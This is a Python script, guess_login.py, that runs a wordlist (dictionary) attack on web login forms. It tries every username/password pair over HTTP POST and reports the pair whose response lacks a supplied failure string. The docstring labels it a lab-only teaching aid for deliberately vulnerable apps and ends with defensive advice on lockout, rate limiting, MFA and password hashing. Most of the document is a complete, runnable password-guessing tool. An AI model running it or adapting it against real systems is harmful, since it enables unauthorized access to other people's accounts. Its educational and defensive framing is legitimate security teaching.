#!/usr/bin/env python3
"""
guess_login.py  -  Login form wordlist (dictionary) attack
==========================================================

!!!  LAB USE ONLY  !!!
----------------------
Point this ONLY at a login form on an app you control: a local DVWA, bWAPP,
Juice Shop, a deliberately-vulnerable VM, or an account you personally own and
are authorized to test. Running password-guessing against anyone else's login
is unauthorized access and is illegal in most jurisdictions. This script is a
teaching aid for understanding *why* weak passwords and unthrottled logins are
dangerous - and therefore how to defend against them. See README.md.

WHAT IT DOES
------------
Submits a login form over and over with username/password combinations from
wordlists, and detects which combination succeeds. This is the educational
cousin of `hydra` / `patator`, deliberately kept simple and single-threaded so
the mechanics are visible.

WHY THIS WORKS (the concept)
----------------------------
A login form is just an HTTP POST: the browser sends the field values
(username=..., password=...) to the form's `action` URL. The server checks them
and responds. If there is no rate-limiting, no lockout, and no CAPTCHA, nothing
stops a program from trying thousands of guesses per minute. Weak or reused
passwords fall quickly to a wordlist.

The hard part is *detecting success*. The server rarely says "login ok" in a
machine-readable way. Common signals, from most to least reliable:
  - a redirect to a dashboard / a new Set-Cookie session (status 302 + Location)
  - the failure page contains a known string ("Login failed", "incorrect")
    and the success page does NOT -> we treat "failure string absent" as success
  - the response length differs noticeably from a known-bad attempt
This script uses the "failure string" method because it is explicit and easy to
reason about: you tell it what text appears on a *failed* login.

PYTHON CONCEPTS TAUGHT
----------------------
- HTTP POST with `requests` and a form-data dict.
- `requests.Session` to carry cookies (many apps set a session cookie first).
- Nested loops (every username x every password).
- String searching (`in`) to detect the failure marker.
- `itertools.product` as a cleaner alternative to nested loops.
- argparse with multiple inputs; reading two wordlists.

DEFENSIVE TAKEAWAY
------------------
This attack dies against good defences: rate-limit and lock accounts after a
few failures, add exponential backoff, require MFA, use CAPTCHA on repeated
failures, and never ship default credentials. Store passwords with a slow salted
hash (bcrypt/argon2) so a leaked database can't be reversed. Alert on many
failed logins from one IP - that pattern is exactly what this script generates.
"""

import argparse
import itertools

import requests


def load_list(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [ln.rstrip("\n") for ln in f if ln.strip() and not ln.startswith("#")]


def attempt_login(session, url, user_field, pass_field, username, password,
                  failure_text, extra_fields, timeout):
    """Submit one username/password pair. Return True if it looks successful.

    `failure_text` is a string that appears on the page ONLY when login fails.
    If that text is absent from the response, we treat the attempt as a success.
    """
    data = {user_field: username, pass_field: password}
    if extra_fields:
        data.update(extra_fields)  # e.g. DVWA needs Login=Login

    try:
        resp = session.post(url, data=data, timeout=timeout)
    except requests.RequestException:
        return False

    # If the known failure marker is NOT on the page, login probably worked.
    return failure_text not in resp.text


def brute_force(url, users, passwords, user_field, pass_field, failure_text,
                extra_fields, timeout):
    """Try every (user, password) combination until one works."""
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (edu-login-test)"})

    # Prime the session: fetch the page once so any anti-CSRF cookie is set.
    try:
        session.get(url, timeout=timeout)
    except requests.RequestException:
        pass

    attempts = 0
    # itertools.product gives us every (user, password) pair without writing
    # two nested for-loops by hand.
    for username, password in itertools.product(users, passwords):
        attempts += 1
        ok = attempt_login(session, url, user_field, pass_field,
                           username, password, failure_text, extra_fields, timeout)
        if ok:
            print(f"\n[+] SUCCESS after {attempts} attempt(s): "
                  f"{username} / {password}")
            return (username, password)
        # Lightweight progress indicator.
        print(f"\r[{attempts}] tried {username}:{password[:20]:<20}", end="")

    print("\n[-] No valid combination found in the given wordlists.")
    return None


def parse_extra(pairs):
    """Turn ['Login=Login', 'csrf=abc'] into {'Login':'Login','csrf':'abc'}."""
    out = {}
    for pair in pairs or []:
        if "=" in pair:
            k, v = pair.split("=", 1)
            out[k] = v
    return out


def main():
    parser = argparse.ArgumentParser(
        description="Dictionary attack a login form on a LAB app you control."
    )
    parser.add_argument("url", help="Login form action URL (where it POSTs)")
    parser.add_argument("users", help="Username wordlist file")
    parser.add_argument("passwords", help="Password wordlist file")
    parser.add_argument("--user-field", default="username",
                        help="Form field name for the username (default: username)")
    parser.add_argument("--pass-field", default="password",
                        help="Form field name for the password (default: password)")
    parser.add_argument("--failure-text", required=True,
                        help="Text shown ONLY on a FAILED login, e.g. 'incorrect'")
    parser.add_argument("--extra", nargs="*",
                        help="Extra form fields, e.g. Login=Login csrf_token=...")
    parser.add_argument("-t", "--timeout", type=float, default=5.0)
    args = parser.parse_args()

    print("=" * 60)
    print(" LAB USE ONLY - attack only logins you are authorized to test.")
    print("=" * 60)

    users = load_list(args.users)
    passwords = load_list(args.passwords)
    extra = parse_extra(args.extra)
    print(f"[*] {len(users)} user(s) x {len(passwords)} password(s) = "
          f"{len(users) * len(passwords)} attempts max\n")

    brute_force(args.url, users, passwords, args.user_field, args.pass_field,
                args.failure_text, extra, args.timeout)


if __name__ == "__main__":
    main()
